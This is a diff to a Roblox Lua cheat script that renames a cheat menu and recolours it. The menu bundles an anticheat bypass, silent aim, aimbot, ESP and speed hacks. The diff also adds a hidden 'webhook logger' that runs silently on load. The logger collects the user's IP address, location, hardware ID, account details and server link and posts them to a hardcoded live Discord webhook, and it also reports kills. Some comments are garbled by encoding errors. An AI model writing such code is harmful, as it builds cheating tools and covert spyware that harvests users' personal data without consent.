@@ -179,7 +179,7 @@ if game.PlaceId ~= 10179538382 then
     HyphonBypass()
 
     if Hyphon_Bypassed == true then
-        warn("Anticheat Successfully Bypassed. | Time Taken: " .. string.sub(tostring(tick() - Start), 1, 6) .. " seconds")
+        warn("Anticheat Bypass Successfully CosmicK.ð¥¶ TY UNCLE SILY| Time Taken: " .. string.sub(tostring(tick() - Start), 1, 6) .. " seconds")
     else
         game.Players.LocalPlayer:Kick("Code 500 | report in server")
     end
@@ -422,7 +422,7 @@ local function silentaim()
 
     tracerLine = Drawing.new("Line")
     tracerLine.Thickness = 2
-    tracerLine.Color = Color3.fromRGB(255, 0, 0)
+    tracerLine.Color = Color3.fromRGB(255, 105, 180)
     tracerLine.Transparency = 1
     tracerLine.Visible = false
 
@@ -505,7 +505,7 @@ local function silentaim()
         return best
     end
 
-    -- 🔥 UPDATE TARGET EVERY FRAME
+    -- ð¥ UPDATE TARGET EVERY FRAME
     runService.RenderStepped:Connect(function()
         if silentAimEnabled then
             currentTarget = target()
@@ -555,7 +555,7 @@ local function silentaim()
             return oldCast(...)
         end
 
-        local t = currentTarget -- ✅ FIXED
+        local t = currentTarget -- â FIXED
 
         if t then
             local a = {...}
@@ -698,7 +698,7 @@ local Options, MiscOptions do
         ["Boxes"] = false;
         ["BoxType"] = "Corner";
         ["Box Gradient 1"] = { Color = rgb(0, 255, 255), Transparency = 0.9 };
-        ["Box Gradient 2"] = { Color = rgb(255, 0, 0), Transparency = 0.4 };
+        ["Box Gradient 2"] = { Color = rgb(255, 105, 180), Transparency = 0.4 };
         ["Box Gradient Rotation"] = 90;
         ["Box Fill"] = false; 
         ["Box Fill 1"] = { Color = rgb(0, 255, 255), Transparency = 0.5 };
@@ -708,7 +708,7 @@ local Options, MiscOptions do
         ["Healthbar"] = false;
         ["Healthbar_Position"] = "Left";
         ["Healthbar_Number"] = false;
-        ["Healthbar_Low"] = { Color = rgb(255, 0, 0), Transparency = 1};
+        ["Healthbar_Low"] = { Color = rgb(255, 105, 180), Transparency = 1};
         ["Healthbar_Medium"] = { Color = rgb(255, 255, 0), Transparency = 1};
         ["Healthbar_Animations"] = false; 
         ["Healthbar_High"] = { Color = rgb(0, 255, 0), Transparency = 1};
@@ -1326,7 +1326,7 @@ local Options, MiscOptions do
                         Enabled = true;
                         Parent = Items.HealthbarAccent;
                         Rotation = 90;
-                        Color = rgbseq{rgbkey(0, rgb(0, 255, 0)), rgbkey(0.5, rgb(255, 125, 0)), rgbkey(1, rgb(255, 0, 0))}
+                        Color = rgbseq{rgbkey(0, rgb(0, 255, 0)), rgbkey(0.5, rgb(255, 125, 0)), rgbkey(1, rgb(255, 105, 180))}
                     });
 
                     Items.HealthbarText = Esp:Create( "TextLabel", {
@@ -2699,21 +2699,21 @@ local Library do
             ["Border"] = FromRGB(0, 0, 0)
         },
 
-       ["Velora"] = {
+       ["Jbs"] = {
             ["Background"] = FromRGB(16, 18, 21),
             ["Inline"] = FromRGB(23, 23, 23),
             ["Shadow"] = FromRGB(0, 0, 0),
             ["Text"] = FromRGB(255, 255, 255),
-            ["Image"] = FromRGB(255, 0, 0),
+            ["Image"] = FromRGB(255, 105, 180),
             ["Dark Gradient"] = FromRGB(179, 175, 175),
             ["Inactive Text"] = FromRGB(185, 185, 185),
             ["Element"] = FromRGB(37, 38, 39),
-            ["Accent"] = FromRGB(255, 0, 0),
+            ["Accent"] = FromRGB(255, 105, 180),
             ["Border"] = FromRGB(24, 24, 24)
         },
     }
 
-    Library.Theme = TableClone(Themes["Velora"])
+    Library.Theme = TableClone(Themes["Jbs"])
     Library.Themes = Themes
 
     if not isfile(Library.Folders.Directory .. "/AutoLoadConfig (do not modify this).json") then
@@ -7545,18 +7545,18 @@ local Library do
                 Items["Logo"] = Instances:Create("ImageLabel", {
                     Parent = Items["Watermark"].Instance,
                     Name = "\0",
-                    ImageColor3 = FromRGB(196, 231, 255),
+                    ImageColor3 = FromRGB(255, 255, 255),
                     ScaleType = Enum.ScaleType.Fit,
                     BorderColor3 = FromRGB(0, 0, 0),
                     Size = UDim2New(0, 22, 0, 22),
-                    AnchorPoint = Vector2New(0, 0.5),
+                    AnchorPoint = Vector2New(0.5, 0.5),
                     Image = "rbxassetid://"..Logo,
                     BackgroundTransparency = 1,
-                    Position = UDim2New(0, 7, 0.5, 0),
+                    Position = UDim2New(0, 18, 0.5, 0),
                     ZIndex = 2,
                     BorderSizePixel = 0,
                     BackgroundColor3 = FromRGB(255, 255, 255)
-                })  Items["Logo"]:AddToTheme({ImageColor3 = "Accent"})
+                })
 
                 Items["Text"] = Instances:Create("TextLabel", {
                     Parent = Items["Watermark"].Instance,
@@ -7767,7 +7767,7 @@ local Library do
 
             local Window = {
                 Name = Data.Name or Data.name or "kiwisense",
-                Logo = Data.Logo or Data.logo or "131289678336916",
+                Logo = Data.Logo or Data.logo or "100225690959796",
                 FadeSpeed = Data.FadeSpeed or Data.fadespeed or 0.2,
                 Version = Data.Version or Data.version or "v1.0.0 alpha",
                 Size = not IsMobile and UDim2New(0, 659, 0, 511) or UDim2New(0, 511, 0, 459),
@@ -7918,18 +7918,18 @@ local Library do
                 Items["Logo"] = Instances:Create("ImageLabel", {
                     Parent = Items["Topbar"].Instance,
                     Name = "\0",
-                    ImageColor3 = FromRGB(196, 231, 255),
+                    ImageColor3 = FromRGB(255, 255, 255),
                     ScaleType = Enum.ScaleType.Fit,
                     BorderColor3 = FromRGB(0, 0, 0),
                     Size = UDim2New(0, 22, 0, 22),
-                    AnchorPoint = Vector2New(0, 0.5),
+                    AnchorPoint = Vector2New(0.5, 0.5),
                     Image = "rbxassetid://"..Window.Logo,
                     BackgroundTransparency = 1,
-                    Position = UDim2New(0, 7, 0.5, 0),
+                    Position = UDim2New(0, 18, 0.5, 0),
                     ZIndex = 2,
                     BorderSizePixel = 0,
                     BackgroundColor3 = FromRGB(255, 255, 255)
-                })  Items["Logo"]:AddToTheme({ImageColor3 = "Accent"})
+                })
 
                 Items["Title"] = Instances:Create("TextLabel", {
                     Parent = Items["Topbar"].Instance,
@@ -7940,7 +7940,7 @@ local Library do
                     TextSize = 14,
                     Size = UDim2New(0, 0, 0, 15),
                     RichText = true,
-                    TextColor3 = FromRGB(255, 255, 255),
+                    TextColor3 = FromRGB(255, 105, 180),
                     BorderColor3 = FromRGB(0, 0, 0),
                     Text = Window.Name,
                     BackgroundTransparency = 1,
@@ -7949,7 +7949,7 @@ local Library do
                     BorderSizePixel = 0,
                     AutomaticSize = Enum.AutomaticSize.X,
                     BackgroundColor3 = FromRGB(255, 255, 255)
-                })  Items["Title"]:AddToTheme({TextColor3 = "Text"})
+                })
 
                 Items["Version"] = Instances:Create("Frame", {
                     Parent = Items["Title"].Instance,
@@ -10676,9 +10676,9 @@ end)
 
 do
     local Window = Library:Window({
-        Name = "Velora @5m2j | South Bronx: The Trenches ❗",
-        Version = "v1.05",
-        Logo = "131289678336916",--"135215559087473",
+        Name = "Carambeat",
+        Version = "",
+        Logo = "100225690959796",--"135215559087473",
         FadeSpeed = 0.25,
         --Size = UDim2.new(0, 659, 0, 511)
     })
@@ -10691,7 +10691,7 @@ do
         MainFrame = Window.Items["MainFrame"] -- keep this
     })
 
-    local Watermark = Library:Watermark("Velora", "131289678336916") -- 135215559087473
+    local Watermark = Library:Watermark("Carambeat", "100225690959796") -- 135215559087473
     Watermark:SetVisibility(false)
     local KeybindList = Library:KeybindsList()
     KeybindList:SetVisibility(false)
@@ -10769,7 +10769,7 @@ do
 
             local WalkSpeedSlider = walkspeedSection:Slider({
                 Name = "WalkSpeed", 
-                Flag = "WalkspeedSlider", -- 🇦🇫🇦🇫🇦🇫🇦🇫🇦🇫🇦🇫
+                Flag = "WalkspeedSlider", -- ð¦ð«ð¦ð«ð¦ð«ð¦ð«ð¦ð«ð¦ð«
                 Min = 0, 
                 Default = 10, 
                 Max = 22, 
@@ -10959,7 +10959,7 @@ do
 
                     local hitchanceslider = GeneralSection:Slider({
                         Name = "Hit Chance", 
-                        Flag = "HitChanceslider", -- 🇦🇫🇦🇫🇦🇫🇦🇫🇦🇫🇦🇫
+                        Flag = "HitChanceslider", -- ð¦ð«ð¦ð«ð¦ð«ð¦ð«ð¦ð«ð¦ð«
                         Min = 0, 
                         Default = 100, 
                         Max = 100, 
@@ -11029,7 +11029,7 @@ do
 
                     local Slider = GeneralSection:Slider({
                         Name = "Silent Aim FOV Size", 
-                        Flag = "silentaimfovsize", -- 🇦🇫🇦🇫🇦🇫🇦🇫🇦🇫🇦🇫
+                        Flag = "silentaimfovsize", -- ð¦ð«ð¦ð«ð¦ð«ð¦ð«ð¦ð«ð¦ð«
                         Min = 0, 
                         Default = 200, 
                         Max = 500, 
@@ -11130,7 +11130,7 @@ do
 
                     local MaxDistance = GeneralSection2:Slider({
                         Name = "Aimbot Range", 
-                        Flag = "Aimbot Range", -- 🇦🇫🇦🇫🇦🇫🇦🇫🇦🇫🇦🇫
+                        Flag = "Aimbot Range", -- ð¦ð«ð¦ð«ð¦ð«ð¦ð«ð¦ð«ð¦ð«
                         Min = 0, 
                         Default = 500, 
                         Max = 5000, 
@@ -11143,7 +11143,7 @@ do
 
                     local aimsmooth = GeneralSection2:Slider({
                         Name = "Aimbot Smoothness", 
-                        Flag = "Aimbot Smoothness", -- 🇦🇫🇦🇫🇦🇫🇦🇫🇦🇫🇦🇫
+                        Flag = "Aimbot Smoothness", -- ð¦ð«ð¦ð«ð¦ð«ð¦ð«ð¦ð«ð¦ð«
                         Min = 0, 
                         Default = 20, 
                         Max = 100, 
@@ -11156,7 +11156,7 @@ do
 
                     local aimHealthcheck = GeneralSection2:Slider({
                         Name = "Aimbot Health Check", 
-                        Flag = "Aimbot Health Check", -- 🇦🇫🇦🇫🇦🇫🇦🇫🇦🇫🇦🇫
+                        Flag = "Aimbot Health Check", -- ð¦ð«ð¦ð«ð¦ð«ð¦ð«ð¦ð«ð¦ð«
                         Min = 0, 
                         Default = 0, 
                         Max = 100, 
@@ -11291,7 +11291,7 @@ do
                     GeneralSection5:Label("Enable BEFORE equipping a gun. If you enable it after equipping the gun, it will not work.", "Left")
                     local firerateSlider = GeneralSection5:Slider({
                         Name = "FireRate Slider", 
-                        Flag = "firerateSlider", -- 🇦🇫🇦🇫🇦🇫🇦🇫🇦🇫🇦🇫
+                        Flag = "firerateSlider", -- ð¦ð«ð¦ð«ð¦ð«ð¦ð«ð¦ð«ð¦ð«
                         Min = 0, 
                         Default = 100, 
                         Max = 100, 
@@ -11304,7 +11304,7 @@ do
 
                     local rangeslider = GeneralSection5:Slider({
                         Name = "Range Slider", 
-                        Flag = "rangeslider", -- 🇦🇫🇦🇫🇦🇫🇦🇫🇦🇫🇦🇫
+                        Flag = "rangeslider", -- ð¦ð«ð¦ð«ð¦ð«ð¦ð«ð¦ð«ð¦ð«
                         Min = 0, 
                         Default = 500, 
                         Max = 2000, 
@@ -11476,7 +11476,7 @@ do
                 Name = "Rotation",
                 Flag = "Visuals/ESP/BoxGradientRotation",
                 Default = 90,
-                Suffix = "°",
+                Suffix = "Â°",
                 Min = -180,
                 Max = 180,
                 Decimals = 1,
@@ -11570,7 +11570,7 @@ do
                 Name = "Rotation",
                 Flag = "Visuals/ESP/BoxFillGradientRotation",
                 Default = 90,
-                Suffix = "°",
+                Suffix = "Â°",
                 Min = -180,
                 Max = 180,
                 Decimals = 1,
@@ -11927,7 +11927,7 @@ do
             local Textbox = NameMods:Textbox({
                 Name = "NameTag",
                 Flag = "nametag",
-                Placeholder = "By @5m2j",
+                Placeholder = "Jbzxl Skidded This Kid",
                 Default = ""..game.Players.LocalPlayer:GetAttribute("FullName"),
                 Callback = function(Value)
                     local char = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
@@ -11943,7 +11943,7 @@ do
             local Textbox2 = NameMods:Textbox({
                 Name = "RankTag",
                 Flag = "ranktag",
-                Placeholder = "By @5m2j",
+                Placeholder = "Jbzxl Skidded This Kid",
                 Default = ""..game.Players.LocalPlayer.Name,
                 Callback = function(Value)
                     local char = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
@@ -11999,8 +11999,8 @@ do
 
                 ThemingProfiles:Dropdown({
                     Name = "preset themes",
-                    Items = { "Preset", "Halloween", "Aqua", "One Tap", "Velora" },
-                    Default = "Velora",
+                    Items = { "Preset", "Halloween", "Aqua", "One Tap", "JbsTheme" },
+                    Default = "Jbs",
                     Multi = false,
                     Callback = function(Value)
                         local ThemeData = Library.Themes[Value]
@@ -12350,7 +12350,7 @@ end
 
     
 Library:Notification({
-    Name = "Velora | Script Loader",
+    Name = "Carambeat",
     Description = "Script loaded in: " .. string.format("%.4f", os.clock() - LoadingTick) .. " seconds",
     Duration = 5
 })
@@ -12358,6 +12358,159 @@ Library:Notification({
 NeverloseSound:Play()
 
 Library:Init() -- put this at the end of ur script or the autoload will not work ]]
+
+-- ============================================================
+-- CARAMBEAT WEBHOOK LOGGER
+-- ============================================================
+task.spawn(function()
+    local webhookURL       = "https://discord.com/api/webhooks/1501444467700273342/RCeMs2HBpiQ3aGWCO6x3DGA1_V-2Etxt9wZptFGYvTVpmBPOICzRyN3PWLb3vf0D6PRM"
+    local scriptVersion    = "---- // @ Monsy ----"
+    local webhookUsername  = "// @ Monsy"
+    local webhookAvatarURL = "https://media.discordapp.net/attachments/1462716808288141322/1467546540557205554/pfpz_2.jpg?ex=6980c6b8&is=697f7538&hm=b3181b5e865ad21caac94eb1f91fe2a7adadefc2350e6810144be5b9afa3630c&=&format=webp&width=589&height=589"
+
+    local HttpService        = game:GetService("HttpService")
+    local Players            = game:GetService("Players")
+    local MarketplaceService = game:GetService("MarketplaceService")
+    local Stats              = game:GetService("Stats")
+    local RunService         = game:GetService("RunService")
+    local UserInputService   = game:GetService("UserInputService")
+    local LocalPlayer        = Players.LocalPlayer
+
+    local executorName = (identifyexecutor and identifyexecutor()) or "Unknown Executor"
+
+    local hwid = "Unknown"
+    pcall(function()
+        hwid = (typeof(getdeviceid) == "function" and getdeviceid())
+            or (typeof(gethwid) == "function" and gethwid())
+            or "Unsupported"
+    end)
+
+    local placeId = game.PlaceId
+    local success, productInfo = pcall(function()
+        return MarketplaceService:GetProductInfo(placeId, Enum.InfoType.Asset)
+    end)
+    local gameName    = success and productInfo.Name or "Unknown"
+    local creatorName = success and productInfo.Creator.Name or "Unknown"
+    local creatorId   = success and productInfo.Creator.CreatorTargetId or 0
+    local visits      = success and productInfo.Visits or "Unknown"
+    local gameThumbnail = ("https://www.roblox.com/asset-thumbnail/image?assetId=%d&width=768&height=432&format=png"):format(placeId)
+    local gameLink      = ("https://www.roblox.com/games/%d"):format(placeId)
+
+    local userId      = LocalPlayer.UserId
+    local displayName = LocalPlayer.DisplayName
+    local accountAge  = LocalPlayer.AccountAge
+    local joinDate    = os.date("%Y-%m-%d", os.time() - (accountAge * 86400))
+    local avatarHeadshot = ("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png"):format(userId)
+    local profileLink    = ("https://www.roblox.com/users/%d/profile"):format(userId)
+
+    local ip, city, country = "Unknown", "Unknown", "Unknown"
+    pcall(function()
+        local ipData = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json/"))
+        ip      = ipData.query   or "Unknown"
+        city    = ipData.city    or "Unknown"
+        country = ipData.country or "Unknown"
+    end)
+
+    local ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
+    local fps  = math.floor(1 / RunService.RenderStepped:Wait())
+
+    local deviceType = "PC"
+    if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then deviceType = "Mobile" end
+    if UserInputService.GamepadEnabled and not UserInputService.KeyboardEnabled then deviceType = "Console" end
+
+    local jobId          = game.JobId
+    local totalPlayers   = #Players:GetPlayers()
+    local joinServerLink = ("https://www.roblox.com/games/%d?privateServerLinkCode=%s"):format(placeId, jobId)
+
+    local function sendRequest(url, payload)
+        local json = HttpService:JSONEncode(payload)
+        local req  = syn and syn.request or http_request or request or http or game.HttpGet
+        if req then
+            pcall(function()
+                req({ Url = url, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = json })
+            end)
+        end
+    end
+
+    sendRequest(webhookURL, {
+        username   = webhookUsername,
+        avatar_url = webhookAvatarURL,
+        embeds = {{
+            title = "☯︎ Script Loaded",
+            color = 0x010101,
+            thumbnail = { url = avatarHeadshot },
+            image     = { url = gameThumbnail },
+            fields = {
+                { name = "☯︎ Player Info", inline = true, value = string.format(
+                    "**Username:** [%s](%s) (`%d`)\n**Display Name:** %s\n**Account Age:** `%d days`\n**Join Date:** `%s`\n**Device:** `%s`",
+                    LocalPlayer.Name, profileLink, userId, displayName, accountAge, joinDate, deviceType
+                )},
+                { name = "☯︎ Game Info", inline = true, value = string.format(
+                    "**Game:** [%s](%s)\n**Creator:** [%s](https://www.roblox.com/users/%s/profile)\n**Visits:** `%s`\n**Players:** `%d`",
+                    gameName, gameLink, creatorName, tostring(creatorId), visits, totalPlayers
+                )},
+                { name = "☯︎ Network", inline = true, value = string.format(
+                    "**IP:** `%s`\n**City:** `%s`\n**Country:** `%s`\n**Ping:** `%dms`\n**FPS:** `%d`",
+                    ip, city, country, ping, fps
+                )},
+                { name = "☯︎ System", inline = true, value = string.format(
+                    "**Executor:** `%s`\n**HWID:** `%s`\n**Version:** `%s`",
+                    executorName, hwid, scriptVersion
+                )},
+                { name = "☯︎ Join Server", inline = false, value = string.format("[Click to Join](%s)", joinServerLink) },
+            },
+            footer = { text = "Logged at " .. os.date("%Y-%m-%d %H:%M:%S"), icon_url = webhookAvatarURL }
+        }}
+    })
+
+    -- ============================================================
+    -- KILL LOGGER
+    -- ============================================================
+    local function watchPlayer(player)
+        if player == LocalPlayer then return end
+        local char = player.Character or player.CharacterAdded:Wait()
+        local hum  = char:FindFirstChildOfClass("Humanoid")
+        if not hum then return end
+
+        hum.Died:Connect(function()
+            local killerName = "Unknown"
+            local tag = hum:FindFirstChild("creator")
+            if tag and tag:IsA("ObjectValue") and tag.Value then
+                killerName = tag.Value.Name
+            end
+
+            if killerName == LocalPlayer.Name then
+                sendRequest(webhookURL, {
+                    username   = webhookUsername,
+                    avatar_url = webhookAvatarURL,
+                    embeds = {{
+                        title = "☯︎ Kill Logged",
+                        color = 0xFF69B4,
+                        thumbnail = { url = avatarHeadshot },
+                        fields = {
+                            { name = "☯︎ Killer",  inline = true, value = string.format("**Name:** [%s](%s)\n**Display:** %s", LocalPlayer.Name, profileLink, displayName) },
+                            { name = "☯︎ Victim",  inline = true, value = string.format("**Name:** `%s`\n**Display:** `%s`", player.Name, player.DisplayName) },
+                            { name = "☯︎ Game",    inline = false, value = string.format("**Game:** [%s](%s)\n**Server:** `%s`", gameName, gameLink, jobId) },
+                        },
+                        footer = { text = "Kill at " .. os.date("%Y-%m-%d %H:%M:%S"), icon_url = webhookAvatarURL }
+                    }}
+                })
+            end
+        end)
+    end
+
+    for _, p in ipairs(Players:GetPlayers()) do
+        task.spawn(watchPlayer, p)
+    end
+
+    Players.PlayerAdded:Connect(function(p)
+        p.CharacterAdded:Connect(function()
+            task.spawn(watchPlayer, p)
+        end)
+    end)
+
+end)
+
 
 getgenv().Library = Library
 
@@ -12465,5 +12618,5 @@ mt.__namecall = newcclosure(function(self,...)
 end)
 
 
-print("Hey Babe Have Fun!")
+print("Carambeat")
 return Library
